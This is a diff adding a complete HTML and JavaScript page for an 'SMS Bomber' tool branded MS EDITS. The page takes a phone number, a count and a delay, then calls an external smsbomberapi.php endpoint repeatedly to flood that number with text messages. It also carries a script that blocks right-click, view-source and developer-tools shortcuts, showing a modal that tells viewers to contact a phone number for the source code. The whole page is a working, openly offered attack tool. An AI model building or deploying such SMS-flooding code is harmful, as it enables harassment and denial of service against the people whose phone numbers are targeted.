@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS Bomber - MS EDITS</title>
+
+    <!-- Paste this before </body> -->
+<script>
+(function() {
+  // Create/remove hacker-style modal (modal is NOT shown on page load)
+  const createModal = () => {
+    if (document.getElementById('inspect-hacker-overlay')) return;
+
+    const overlay = document.createElement('div');
+    overlay.id = 'inspect-hacker-overlay';
+    Object.assign(overlay.style, {
+      position: 'fixed',
+      inset: '0',
+      background: '#000',
+      display: 'flex',
+      alignItems: 'center',
+      justifyContent: 'center',
+      zIndex: '2147483647',
+      fontFamily: "Courier New, 'Lucida Console', monospace",
+      color: '#39ff14'
+    });
+
+    const box = document.createElement('div');
+    box.id = 'inspect-hacker-modal';
+    Object.assign(box.style, {
+      width: '92%',
+      maxWidth: '760px',
+      background: 'rgba(0,0,0,0.95)',
+      border: '1px solid rgba(57,255,20,0.12)',
+      padding: '28px',
+      borderRadius: '8px',
+      boxShadow: '0 20px 60px rgba(0,0,0,0.9), 0 0 40px rgba(57,255,20,0.06) inset',
+      textAlign: 'left',
+      lineHeight: '1.6'
+    });
+
+    const header = document.createElement('div');
+    header.innerHTML = '⚠️  <span style="font-weight:700; letter-spacing:1px;">INSPECTION NOT ALLOWED</span>';
+    Object.assign(header.style, {
+      color: '#39ff14',
+      fontSize: '20px',
+      marginBottom: '12px'
+    });
+
+    const terminal = document.createElement('div');
+    Object.assign(terminal.style, {
+      background: 'transparent',
+      padding: '14px',
+      borderRadius: '6px',
+      minHeight: '90px',
+      color: '#39ff14',
+      fontSize: '15px',
+      whiteSpace: 'pre-wrap'
+    });
+
+    const msg = document.createElement('div');
+    msg.innerText =
+`ms edits — my dear son:
+If you want this tool's source code, contact: 03167364896
+
+اگر آپ کو اس ٹول کا کوڈ چاہیے تو اس نمبر پر رابطہ کریں:
+03167364896
+`;
+    terminal.appendChild(msg);
+
+    const caret = document.createElement('span');
+    caret.textContent = ' █';
+    Object.assign(caret.style, {
+      display: 'inline-block',
+      marginLeft: '6px',
+      animation: 'blink 1s steps(2, start) infinite'
+    });
+    terminal.appendChild(caret);
+
+    const btn = document.createElement('button');
+    btn.innerText = 'I UNDERSTAND';
+    Object.assign(btn.style, {
+      marginTop: '16px',
+      padding: '10px 20px',
+      fontSize: '14px',
+      fontFamily: "Courier New, monospace",
+      color: '#001b00',
+      background: 'linear-gradient(90deg, rgba(57,255,20,0.95), rgba(30,200,10,0.95))',
+      border: '1px solid rgba(57,255,20,0.9)',
+      borderRadius: '6px',
+      cursor: 'pointer',
+      boxShadow: '0 6px 20px rgba(57,255,20,0.10), 0 0 18px rgba(57,255,20,0.06) inset'
+    });
+    btn.addEventListener('click', removeModal);
+
+    box.appendChild(header);
+    box.appendChild(terminal);
+    box.appendChild(btn);
+    overlay.appendChild(box);
+    document.body.appendChild(overlay);
+
+    // blinking animation
+    if (!document.getElementById('inspect-hacker-anim')) {
+      const style = document.createElement('style');
+      style.id = 'inspect-hacker-anim';
+      style.innerHTML = '@keyframes blink { 50% { opacity: 0 } 100% { opacity: 1 } }';
+      document.head.appendChild(style);
+    }
+  };
+
+  const removeModal = () => {
+    const el = document.getElementById('inspect-hacker-overlay');
+    if (el) el.remove();
+  };
+
+  // BLOCK actions: only show modal when these actions happen
+  document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+    createModal();
+  });
+
+  document.addEventListener('keydown', function(e) {
+    const key = e.key || String.fromCharCode(e.keyCode || 0);
+
+    // F12
+    if (key === 'F12' || e.keyCode === 123) {
+      e.preventDefault();
+      createModal();
+      return;
+    }
+
+    // Ctrl+Shift+I or Ctrl+Shift+J
+    if (e.ctrlKey && e.shiftKey && (key.toLowerCase() === 'i' || key.toLowerCase() === 'j')) {
+      e.preventDefault();
+      createModal();
+      return;
+    }
+
+    // Ctrl+U (view-source)
+    if (e.ctrlKey && key.toLowerCase() === 'u') {
+      e.preventDefault();
+      createModal();
+      return;
+    }
+
+    // Ctrl+Shift+C (element picker)
+    if (e.ctrlKey && e.shiftKey && key.toLowerCase() === 'c') {
+      e.preventDefault();
+      createModal();
+      return;
+    }
+  });
+
+  // Optional: allow removal from console by site owner if needed:
+  // document.getElementById('inspect-hacker-overlay')?.remove();
+
+})();
+</script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #000;
+            color: #0f0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            overflow: auto; /* Fixed scrolling issue */
+            position: relative;
+        }
+
+        /* Binary Animation Background */
+        .binary-bg {
+            position: fixed; /* Changed to fixed to prevent scrolling */
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.3;
+            overflow: hidden;
+        }
+
+        .binary-code {
+            position: absolute;
+            color: #0f0;
+            font-size: 14px;
+            white-space: nowrap;
+            animation: fall linear infinite;
+            opacity: 0.7;
+        }
+
+        @keyframes fall {
+            0% {
+                transform: translateY(-100px);
+                opacity: 0;
+            }
+            10% {
+                opacity: 0.7;
+            }
+            90% {
+                opacity: 0.7;
+            }
+            100% {
+                transform: translateY(100vh);
+                opacity: 0;
+            }
+        }
+
+        .container {
+            background: rgba(10, 15, 10, 0.95);
+            border-radius: 15px;
+            padding: 35px;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.5);
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+            border: 2px solid #0f0;
+            position: relative;
+            z-index: 1;
+            margin: 20px 0; /* Added margin for better spacing */
+        }
+
+        .logo {
+            font-size: 2.5em;
+            font-weight: bold;
+            color: #0f0;
+            margin-bottom: 15px;
+            text-shadow: 0 0 15px rgba(0, 255, 0, 0.8);
+            letter-spacing: 3px;
+        }
+
+        .subtitle {
+            color: #0f0;
+            margin-bottom: 30px;
+            font-size: 1.1em;
+            border-bottom: 2px solid #0f0;
+            padding-bottom: 15px;
+            font-weight: bold;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            color: #0f0;
+            font-weight: 600;
+            font-size: 1em;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #0a0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: rgba(0, 20, 0, 0.6);
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #0f0;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.7);
+            background: rgba(0, 30, 0, 0.7);
+        }
+
+        /* Fixed placeholder color */
+        .form-group input::placeholder {
+            color: #0a0;
+            font-weight: normal;
+            opacity: 0.7;
+        }
+
+        .start-button {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #0a0 0%, #0f0 100%);
+            color: #000;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-top: 10px;
+            font-family: 'Courier New', monospace;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.6);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .start-button:hover {
+            box-shadow: 0 0 25px rgba(0, 255, 0, 0.9);
+            transform: translateY(-3px);
+            letter-spacing: 3px;
+        }
+
+        .start-button:active {
+            transform: translateY(0);
+        }
+
+        .start-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+            letter-spacing: 2px;
+        }
+
+        .start-button::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+            transition: 0.5s;
+        }
+
+        .start-button:hover::after {
+            left: 100%;
+        }
+
+        .status {
+            margin-top: 20px;
+            padding: 18px;
+            border-radius: 8px;
+            font-weight: bold;
+            display: none;
+            border: 2px solid;
+            font-family: 'Courier New', monospace;
+            font-size: 1em;
+            transition: all 0.3s ease;
+        }
+
+        .status:hover {
+            transform: scale(1.02);
+        }
+
+        .status.success {
+            background: rgba(0, 40, 0, 0.6);
+            color: #0f0;
+            border-color: #0a0;
+        }
+
+        .status.error {
+            background: rgba(40, 0, 0, 0.6);
+            color: #f00;
+            border-color: #a00;
+        }
+
+        .status.info {
+            background: rgba(0, 20, 40, 0.6);
+            color: #0af;
+            border-color: #06a;
+        }
+
+        .footer {
+            margin-top: 30px;
+            padding-top: 25px;
+            border-top: 2px solid #0a0;
+        }
+
+        .powered-by {
+            color: #0f0;
+            font-size: 1em;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+
+        .whatsapp-link {
+            display: inline-block;
+            background: #0a0;
+            color: #000;
+            padding: 12px 20px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            font-family: 'Courier New', monospace;
+            font-size: 1em;
+            border: 2px solid #0a0;
+        }
+
+        .whatsapp-link:hover {
+            background: #0f0;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.7);
+            transform: translateY(-3px);
+            border-color: #0f0;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background: rgba(0, 20, 0, 0.6);
+            border-radius: 5px;
+            margin-top: 20px;
+            overflow: hidden;
+            display: none;
+            border: 2px solid #0a0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #0a0, #0f0);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 25px 20px;
+                margin: 15px;
+            }
+            
+            .logo {
+                font-size: 2em;
+            }
+            
+            .subtitle {
+                font-size: 1em;
+            }
+            
+            .form-group input {
+                font-size: 1em;
+                padding: 14px;
+            }
+            
+            .start-button {
+                font-size: 1em;
+                padding: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Binary Animation Background -->
+    <div class="binary-bg" id="binaryBg"></div>
+    
+    <div class="container">
+        <div class="logo">SMS BOMBER</div>
+        <div class="subtitle">POWERFUL SMS BOMBER TOOL</div>
+        
+        <form id="bomberForm">
+            <div class="form-group">
+                <label for="phoneNumber">ENTER YOUR NUMBER</label>
+                <input type="tel" id="phoneNumber" placeholder="923001234567" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="registerAmount">ENTER AMOUNT OF REGISTER</label>
+                <input type="number" id="registerAmount" placeholder="10" min="1" max="100" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="delaySeconds">ENTER SEC OF DELAYS</label>
+                <input type="number" id="delaySeconds" placeholder="5" min="1" max="60" required>
+            </div>
+            
+            <button type="submit" class="start-button" id="startButton">
+                START NOW
+            </button>
+            
+            <div class="progress-bar" id="progressBar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            
+            <div class="status" id="statusMessage"></div>
+        </form>
+        
+        <div class="footer">
+            <div class="powered-by">MS EDITS © OFFICIAL</div>
+            <a href="https://whatsapp.com/channel/0029VbAzazM2kNFp4p1qIZ2P" class="whatsapp-link" target="_blank">
+                📱 JOIN WHATSAPP CHANNEL
+            </a>
+        </div>
+    </div>
+
+    <script>
+        // Binary Animation Script
+        function createBinaryAnimation() {
+            const binaryBg = document.getElementById('binaryBg');
+            const binaryChars = '01';
+            
+            for (let i = 0; i < 60; i++) {
+                const binaryElement = document.createElement('div');
+                binaryElement.className = 'binary-code';
+                
+                // Create random binary string
+                let binaryString = '';
+                const length = Math.floor(Math.random() * 25) + 15;
+                for (let j = 0; j < length; j++) {
+                    binaryString += binaryChars.charAt(Math.floor(Math.random() * binaryChars.length));
+                }
+                
+                binaryElement.textContent = binaryString;
+                binaryElement.style.left = Math.random() * 100 + 'vw';
+                binaryElement.style.animationDuration = (Math.random() * 10 + 10) + 's';
+                binaryElement.style.animationDelay = (Math.random() * 5) + 's';
+                
+                binaryBg.appendChild(binaryElement);
+            }
+        }
+        
+        // Initialize binary animation
+        createBinaryAnimation();
+
+        // YOUR ORIGINAL SCRIPT - NO CHANGES MADE
+        const form = document.getElementById('bomberForm');
+        const startButton = document.getElementById('startButton');
+        const statusMessage = document.getElementById('statusMessage');
+        const progressBar = document.getElementById('progressBar');
+        const progressFill = document.getElementById('progressFill');
+
+        function showStatus(message, type) {
+            statusMessage.textContent = message;
+            statusMessage.className = `status ${type}`;
+            statusMessage.style.display = 'block';
+        }
+
+        function hideStatus() {
+            statusMessage.style.display = 'none';
+        }
+
+        function updateProgress(percentage) {
+            progressFill.style.width = percentage + '%';
+        }
+
+        function showProgress() {
+            progressBar.style.display = 'block';
+        }
+
+        function hideProgress() {
+            progressBar.style.display = 'none';
+            updateProgress(0);
+        }
+
+        async function callAPI(phoneNumber) {
+            const apiUrl = `https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${phoneNumber}`;
+            
+            try {
+                const response = await fetch(apiUrl, {
+                    method: 'GET',
+                    mode: 'no-cors' // Handle CORS issues
+                });
+                
+                // Since we're using no-cors, we can't read the response
+                // We'll assume success if no error is thrown
+                return { success: true };
+            } catch (error) {
+                console.error('API call failed:', error);
+                return { success: false, error: error.message };
+            }
+        }
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+            const registerAmount = parseInt(document.getElementById('registerAmount').value);
+            const delaySeconds = parseInt(document.getElementById('delaySeconds').value);
+            
+            // Validation
+            if (!phoneNumber || !registerAmount || !delaySeconds) {
+                showStatus('Please fill in all fields!', 'error');
+                return;
+            }
+            
+            if (phoneNumber.length < 10) {
+                showStatus('Please enter a valid phone number!', 'error');
+                return;
+            }
+            
+            // Disable button and show progress
+            startButton.disabled = true;
+            startButton.textContent = 'PROCESSING...';
+            hideStatus();
+            showProgress();
+            
+            try {
+                showStatus(`Starting SMS bomber for ${phoneNumber}...`, 'info');
+                
+                for (let i = 0; i < registerAmount; i++) {
+                    // Update progress
+                    const progress = ((i + 1) / registerAmount) * 100;
+                    updateProgress(progress);
+                    
+                    showStatus(`Sending SMS ${i + 1} of ${registerAmount}...`, 'info');
+                    
+                    // Call the API
+                    const result = await callAPI(phoneNumber);
+                    
+                    if (!result.success) {
+                        showStatus(`Failed at SMS ${i + 1}: ${result.error}`, 'error');
+                        break;
+                    }
+                    
+                    // Wait for delay (except for the last iteration)
+                    if (i < registerAmount - 1) {
+                        await new Promise(resolve => setTimeout(resolve, delaySeconds * 1000));
+                    }
+                }
+                
+                updateProgress(100);
+                showStatus(`Successfully completed! Sent ${registerAmount} SMS to ${phoneNumber}`, 'success');
+                
+            } catch (error) {
+                showStatus(`Error: ${error.message}`, 'error');
+            } finally {
+                // Re-enable button
+                startButton.disabled = false;
+                startButton.textContent = 'START NOW';
+                
+                // Hide progress after 3 seconds
+                setTimeout(() => {
+                    hideProgress();
+                }, 3000);
+            }
+        });
+
+        // Auto-format phone number
+        document.getElementById('phoneNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+            e.target.value = value;
+        });
+
+        // Limit register amount
+        document.getElementById('registerAmount').addEventListener('input', function(e) {
+            let value = parseInt(e.target.value);
+            if (value > 100) e.target.value = 100;
+            if (value < 1) e.target.value = 1;
+        });
+
+        // Limit delay seconds
+        document.getElementById('delaySeconds').addEventListener('input', function(e) {
+            let value = parseInt(e.target.value);
+            if (value > 60) e.target.value = 60;
+            if (value < 1) e.target.value = 1;
+        });
+    </script>
+</body>
+</html>
